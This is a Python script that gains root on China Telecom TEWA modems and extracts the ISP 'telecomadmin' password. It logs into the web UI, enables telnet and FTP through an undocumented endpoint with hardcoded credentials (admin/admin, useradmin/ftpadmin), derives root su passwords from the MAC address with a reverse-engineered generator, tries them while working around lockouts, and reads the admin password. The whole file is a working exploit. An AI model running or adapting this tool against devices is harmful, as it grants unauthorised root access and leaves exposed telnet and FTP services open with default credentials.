#!/usr/bin/env python3
"""
Extracts the telecomadmin password from TEWA modems (China Telecom) in one shot.

Steps automated:
  1. Log into web UI at 192.168.1.1:8080 to get the session key
  2. Enable telnet via the telandftpcfg.cmd endpoint
  3. Telnet in as admin/admin
  4. su with the MAC-derived password, then run 'telecomadmin get'

Usage:
  python3 modem_extract.py AA:BB:CC:DD:EE:FF
  python3 modem_extract.py --host 192.168.1.1 --session-key 1234567890 AA:BB:CC:DD:EE:FF
"""

import re
import sys
import time
import base64
import socket
import argparse
import urllib.request
import urllib.parse


# ---------------------------------------------------------------------------
# SU password generator
# ---------------------------------------------------------------------------

def generate_a1(hex_str):
    cts = [
        'QbNUTaMecPWVSKdCgXIJRrsfYXwyqpvnDHWzQuPmAGtAxRTphBcwBnNkjbFmvVMqaFkEutSrDCxsCKjBzEyDEUJTZfHZghMHYFdeASGNaUgFtdbYRkshJHkFNXMcKdfw',
        'NXMcKdfwRkshJHkFaUgFtdbYYFdeASGNZfHZghMHzEyDEUJTDCxsCKjBaFkEutSrjbFmvVMqhBcwBnNkAGtAxRTpDHWzQuPmYXwyqpvngXIJRrsfcPWVSKdCQbNUTaMe',
        'eMaTUNbQCdKSVWPcfsrRJIXgnvpqywXYmPuQzWHDpTRxAtGAkNnBwcBhqMVvmFbjrStuEkFaBjKCsxCDTJUEDyEzHMhgZHfZNGSAedFYYbdtFgUaFkHJhskRwfdKcMXN',
        'CbntTaMGFPWTSkdCtXIYRrsfaXyyqpvRbHWAJuPSAGtacRTpVKcmBnNevbFMvSMPDFkEuRSDXCssCKjszEyDEUJCZfckghBHYFseASaNaUgFPfbYRLSubTkFKXMcKdfH',
        'gXIJRrsfNXMcKdfwYXwZqpvnQuPmDHWzAGtQxRTpjbFmvVMqDCxsjBCKzEyDEUJTHbCwBnIkZfHZghMHYASGFdeNcPWVSKdCaUgFtdbYRkshJHkFQbNUTaMeaFkLutSr',
    ]
    hex_clean = ''.join(c for c in hex_str.upper() if c in '0123456789ABCDEF')
    if len(hex_clean) < 12:
        return None
    v19 = [ord(c) for c in reversed(hex_clean[-8:])]
    v10 = next(((c - 48 | j) for j, c in enumerate(v19) if 49 <= c <= 57), 5)
    results = [[] for _ in range(len(cts))]
    for k in range(len(v19)):
        v15 = v19[k] & v19[7 - k] if k < 4 else v19[k] | v19[k - 4]
        v16 = v15 + v10
        if v16 > 127:
            v16, v10 = k, k
        for i in range(len(cts)):
            results[i].append(cts[i][v16])
        v10 += max(k, 1)
    return [(''.join(lst)) for lst in results]


# ---------------------------------------------------------------------------
# Minimal telnet client (no telnetlib — works on Python 3.13+)
# ---------------------------------------------------------------------------

class Telnet:
    def __init__(self, host, port=23, timeout=15):
        self.buf = b''
        self.sock = socket.create_connection((host, port), timeout=timeout)

    def _recv_strip_iac(self):
        raw = self.sock.recv(4096)
        out, i = b'', 0
        while i < len(raw):
            b = raw[i]
            if b == 0xFF and i + 2 < len(raw):      # IAC
                cmd, opt = raw[i + 1], raw[i + 2]
                if cmd in (0xFB, 0xFD):              # WILL/DO -> reply DONT/WONT
                    self.sock.sendall(bytes([0xFF, 0xFE if cmd == 0xFD else 0xFC, opt]))
                i += 3
            else:
                out += bytes([b])
                i += 1
        return out

    def read_until(self, marker, timeout=10):
        deadline = time.time() + timeout
        while marker not in self.buf:
            remaining = deadline - time.time()
            if remaining <= 0:
                break
            self.sock.settimeout(min(remaining, 0.3))
            try:
                self.buf += self._recv_strip_iac()
            except (socket.timeout, OSError):
                pass
        idx = self.buf.find(marker)
        if idx >= 0:
            result, self.buf = self.buf[:idx + len(marker)], self.buf[idx + len(marker):]
            return result
        result, self.buf = self.buf, b''
        return result

    def expect(self, patterns, timeout=10):
        """Read until the first matching pattern appears. Returns (data, matched_pattern | None)."""
        deadline = time.time() + timeout
        while time.time() < deadline:
            # Check buffer first before trying to read more
            for p in patterns:
                if p in self.buf:
                    idx = self.buf.find(p)
                    result, self.buf = self.buf[:idx + len(p)], self.buf[idx + len(p):]
                    return result, p
            remaining = deadline - time.time()
            if remaining <= 0:
                break
            self.sock.settimeout(min(remaining, 0.3))
            try:
                self.buf += self._recv_strip_iac()
            except (socket.timeout, OSError):
                pass  # keep looping until deadline — don't exit early
        # Final check after timeout
        for p in patterns:
            if p in self.buf:
                idx = self.buf.find(p)
                result, self.buf = self.buf[:idx + len(p)], self.buf[idx + len(p):]
                return result, p
        result, self.buf = self.buf, b''
        return result, None

    def write(self, data):
        self.sock.sendall(data)

    def close(self):
        self.sock.close()


# ---------------------------------------------------------------------------
# Step 1: get session key from the modem web UI
# ---------------------------------------------------------------------------

def login_and_enable_telnet(host, port, web_user, web_pass):
    """
    Login flow (discovered by inspecting the modem's login.html):
      1. GET login.html  -> extract set3_sessionKey from the routeSet button onclick
      2. POST login.cgi  -> username + base64(password), no sessionKey in body
      3. GET telandftpcfg.cmd with set3_sessionKey (same urllib opener = same IP session)
    Returns True on success.
    """
    import http.cookiejar
    base = f'http://{host}:{port}'
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

    def fetch(url, data=None, referer=None):
        req = urllib.request.Request(
            url,
            data=urllib.parse.urlencode(data).encode() if data else None
        )
        req.add_header('User-Agent', 'Mozilla/5.0')
        if referer:
            req.add_header('Referer', referer)
        try:
            with opener.open(req, timeout=10) as r:
                return r.read().decode('utf-8', errors='ignore'), r.status
        except Exception as e:
            return '', 0

    # Step 1: login — password must be base64-encoded, no sessionKey field in body
    fetch(f'{base}/login.html')   # prime the session
    pwd_b64 = base64.b64encode(web_pass.encode()).decode()
    main_page, status = fetch(f'{base}/login.cgi',
                               data={'username': web_user, 'password': pwd_b64},
                               referer=f'{base}/login.html')
    if status != 200 or 'login.html' in main_page[:100]:
        return False, None, None
    sk_m = re.search(r"var sessionKey='(\w+)'", main_page)
    if not sk_m:
        return False, None, None
    session_key = sk_m.group(1)
    print(f'[*] Logged in (sessionKey: {session_key})')

    # Step 2: enable telnet — plain sessionKey param is what this endpoint accepts
    params = urllib.parse.urlencode({
        'action': 'add',
        'telusername': 'admin', 'telpwd': 'admin', 'telport': 23, 'telenable': 1,
        'ftpusername': 'useradmin', 'ftppwd': 'ftpadmin', 'ftpport': 21, 'ftpenable': 1,
        'sessionKey': session_key,
    })
    resp, status = fetch(f'{base}/telandftpcfg.cmd?{params}')
    if status != 200 or 'login.html' in resp:
        return False, None, None

    # Calling action=view resets the telnet daemon — skip it and use the creds we just set
    tel_user, tel_pass = 'admin', 'admin'
    print(f'[*] Telnet credentials: {tel_user} / {tel_pass}')
    return True, tel_user, tel_pass


# ---------------------------------------------------------------------------
# Steps 3 & 4: telnet in and extract password
# ---------------------------------------------------------------------------

def extract_via_telnet(host, su_candidates, tel_user='admin', tel_pass='admin'):
    print(f'[*] Connecting to {host}:23 via telnet...')
    tn = None
    for attempt in range(10):
        try:
            tn = Telnet(host, 23, timeout=15)
            break
        except OSError:
            if attempt < 9:
                time.sleep(2)
    if tn is None:
        print('[!] Could not connect to telnet after 20s.')
        return None
    try:
        tn.read_until(b'Login:', timeout=10)
        tn.write(tel_user.encode() + b'\r\n')
        tn.read_until(b'Password:', timeout=5)
        tn.write(tel_pass.encode() + b'\r\n')
        tn.read_until(b'$', timeout=8)

        for pwd in su_candidates:
            print(f'  trying SU password: {pwd}')
            tn.write(b'su\r\n')

            # Stop immediately when we see Password: or Locked (don't waste time waiting for $)
            data, matched = tn.expect([b'Password', b'Locked'], timeout=8)

            if matched == b'Locked':
                text = data.decode('utf-8', errors='ignore')
                wait_m = re.search(r'after\s+(\d+)\s+second', text, re.IGNORECASE)
                wait = int(wait_m.group(1)) + 1 if wait_m else 5
                print(f'  [!] su locked, waiting {wait}s...')
                time.sleep(wait)
                tn.read_until(b'$', timeout=3)  # flush the $ prompt
                tn.write(b'su\r\n')
                data, matched = tn.expect([b'Password', b'Locked'], timeout=8)

            if matched != b'Password':
                print(f'  [!] no password prompt, skipping')
                continue

            tn.write(pwd.encode() + b'\r\n')

            # Wait for # (root shell) or $ (wrong password) — generous timeout
            data, matched = tn.expect([b'# ', b'\r#', b'incorrect', b'$'], timeout=10)
            if b'#' not in (matched or b''):
                # Wrong password — ensure we're back at $ before next attempt
                if matched != b'$':
                    tn.read_until(b'$', timeout=5)
                time.sleep(2)  # brief pause to avoid rate-limiting
                continue

            print(f'  [+] SU succeeded')
            tn.write(b'exit\r\n')
            tn.read_until(b'>', timeout=15)
            tn.write(b'telecomadmin get\r\n')
            out = tn.read_until(b'>', timeout=15)
            text = out.decode('utf-8', errors='ignore')
            m = re.search(r'passwd=(\S+)', text)
            return m.group(1) if m else None

        return None
    finally:
        tn.close()


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(description='Extract telecomadmin password from TEWA modem')
    ap.add_argument('mac',           nargs='?', help='Modem MAC address (any format)')
    ap.add_argument('--host',        default=None,  metavar='IP')
    ap.add_argument('--port',        default=8080,  type=int, metavar='PORT')
    ap.add_argument('--web-user',    default=None,  metavar='USER')
    ap.add_argument('--web-pass',    default=None,  metavar='PASS')
    ap.add_argument('--session-key', default=None,  metavar='KEY',
                    help='Skip web login and use this session key directly')
    args = ap.parse_args()

    def prompt(msg, default):
        val = input(f'{msg} [default: {default}]: ').strip()
        return val if val else default

    mac      = args.mac      or input('Enter modem MAC address: ').strip()
    host     = args.host     or prompt('Modem IP address',  '192.168.1.1')
    web_user = args.web_user or prompt('Web UI username',   'useradmin')
    web_pass = args.web_pass or input( 'Web UI password: ').strip()

    candidates = generate_a1(mac)
    if not candidates:
        sys.exit('Invalid MAC address.')
    print(f'[*] SU candidates: {candidates}')

    print(f'[*] Logging in and enabling telnet on {host}:{args.port}...')
    ok, tel_user, tel_pass = login_and_enable_telnet(host, args.port, web_user, web_pass)
    if not ok:
        print('[!] Failed to log in or enable telnet.')
        print('    Check your web UI credentials and modem IP.')
        sys.exit(1)
    print('[*] Telnet enabled.')

    password = extract_via_telnet(host, candidates, tel_user, tel_pass)

    if password:
        print(f'\n[+] telecomadmin password: {password}')
    else:
        print('\n[!] Could not retrieve password.')
        print('    Check that the SU password candidates are correct for your modem MAC.')
        sys.exit(1)


if __name__ == '__main__':
    main()
